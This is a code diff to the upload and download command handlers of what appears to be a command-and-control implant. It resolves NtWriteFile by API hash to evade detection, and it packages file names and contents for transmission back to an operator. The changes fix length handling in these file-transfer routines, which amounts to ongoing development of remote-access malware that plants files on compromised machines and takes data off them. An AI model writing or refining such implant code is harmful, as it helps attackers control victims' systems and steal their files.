@@ -229,7 +229,7 @@ VOID CommandUpload( PPARSER Parser ) {
     UNICODE_STRING file_path;
     char file_name[MAX_PATH] = { 0 };
     memcpy(file_name,FileName, NameSize - 1);
-    //NameSize = strlen(file_name);
+    NameSize = NameSize - 1;
 
     // FIX THIS STRING
     // _tprintf("Before: %s\n", file_name);
@@ -260,7 +260,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
     void *p_nt_write_file = get_proc_address_by_hash(p_ntdll, NtWriteFile_CRC32B);
     NtWriteFile_t g_nt_write_file = (NtWriteFile_t) p_nt_write_file;
-    if ((status = g_nt_write_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, 0, 0)) != 0x0) {
+    if ((status = g_nt_write_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize-1, 0, 0)) != 0x0) {
         //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
         goto Cleanup;
     }
@@ -268,7 +268,7 @@ VOID CommandUpload( PPARSER Parser ) {
     Written = io_status_block.Information;
 
     PackageAddInt32(Package, FileSize-1);
-    PackageAddBytes(Package, (PUCHAR) FileName, NameSize-1);
+    PackageAddBytes(Package, (PUCHAR) FileName, NameSize);
     PackageTransmit(Package, NULL, NULL);
 
     Cleanup:
@@ -397,8 +397,8 @@ VOID CommandDownload( PPARSER Parser ) {
     Read += io_status_block.Information;
 
     //Read = io_status_block.Information;
-    PackageAddBytes( Package, FileName, NameSize-2);
-    PackageAddBytes( Package, Content,  FileSize-2);
+    PackageAddBytes( Package, FileName, NameSize);
+    PackageAddBytes( Package, Content,  FileSize);
 
     PackageTransmit( Package, NULL, NULL );
 
